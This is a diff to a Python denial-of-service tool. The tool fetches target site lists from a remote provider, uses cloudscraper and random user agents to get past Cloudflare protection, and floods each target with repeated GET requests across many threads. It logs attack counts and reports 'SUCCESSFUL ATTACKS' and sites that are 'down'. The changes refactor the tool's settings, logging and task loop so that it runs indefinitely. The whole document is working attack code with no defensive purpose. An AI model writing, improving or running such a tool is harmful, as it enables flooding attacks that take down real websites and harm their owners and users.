@@ -1,9 +1,7 @@
-import json
 import os
 import platform
-
 from argparse import ArgumentParser
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from gc import collect
 from os import system
 from sys import stderr
@@ -17,9 +15,10 @@ from pyuseragents import random as random_useragent
 from requests.exceptions import ConnectionError
 from urllib3 import disable_warnings
 
-import settings
-from RemoteProvider import RemoteProvider
+from settings import get_settings
+from remote_provider import RemoteProvider
 
+settings = get_settings()
 disable_warnings()
 
 parser = ArgumentParser()
@@ -39,19 +38,23 @@ no_clear = args.no_clear
 proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
+
 threads = int(args.threads)
+
 executor = ThreadPoolExecutor(max_workers=threads)
 
-logger.remove()
-logger.add(
-    args.logger_output,
-    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
-        <cyan>{line}</cyan> - <white>{message}</white>")
-logger.add(
-    args.logger_results,
-    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
-        <cyan>{line}</cyan> - <white>{message}</white>",
-    level="SUCCESS")
+
+def set_logger_format():
+    logger.remove()
+    logger.add(
+        args.logger_output,
+        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
+            <cyan>{line}</cyan> - <white>{message}</white>")
+    logger.add(
+        args.logger_results,
+        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
+            <cyan>{line}</cyan> - <white>{message}</white>",
+        level="SUCCESS")
 
 
 def check_req():
@@ -62,16 +65,14 @@ def check_req():
 
 
 def mainth(site: str):
-    result = 'processing'
     scraper = cloudscraper.create_scraper(
-        browser=settings.BROWSER, )
-    scraper.headers.update(
-        {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
-         'Connection': 'keep-alive',
-         'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
-         'Accept-Encoding': 'gzip, deflate, br'})
+        browser=settings.BROWSER
+    )
+    headers = settings.HEADERS_TEMPLATE
+    headers['User-Agent'] = random_useragent()
+    scraper.headers.update(headers)
 
-    logger.info("STARTING ATTACK TO " + site)
+    logger.info(f"STARTING ATTACK TO {site}")
 
     attacks_number = 0
 
@@ -90,30 +91,27 @@ def mainth(site: str):
                 response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                 if 200 <= response.status_code <= 302:
                     while attacks_number < settings.MAX_REQUESTS_TO_SITE:
-                        response = scraper.get(site, timeout=10)
+                        response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                         if response.status_code >= 400:
                             break
                         attacks_number += 1
                         logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         else:
             while attacks_number < settings.MAX_REQUESTS_TO_SITE:
-                response = scraper.get(site, timeout=10)
+                response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                 if response.status_code >= 400:
                     break
                 attacks_number += 1
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
-    except ConnectionError as exc:
+    except ConnectionError:
         logger.success(f"{site} is down")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
     except Exception as exc:
         logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+    # when thread finishes, add new task to executor
+    executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+
 
 def clear():
     if platform.system() == "Linux":
@@ -125,18 +123,25 @@ def clear():
 def cleaner():
     while True:
         sleep(60)
-
         if not no_clear:
             clear()
         collect()
 
 
 if __name__ == '__main__':
-    if not no_clear:
-        clear()
-    check_req()
-    Thread(target=cleaner, daemon=True).start()
-    sites = remoteProvider.get_target_sites()
-    # initially start as many tasks as configured threads
-    for _ in range(threads):
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+    try:
+        set_logger_format()
+        if not no_clear:
+            clear()
+        check_req()
+
+        Thread(target=cleaner, daemon=True).start()
+        while True:
+            sites = remoteProvider.get_target_sites()
+            # initially start as many tasks as configured threads
+            for _ in range(threads):
+                executor.submit(mainth, choice(sites))
+            collect()
+    except KeyboardInterrupt:
+        logger.info("Shutdown")
+        executor.shutdown()
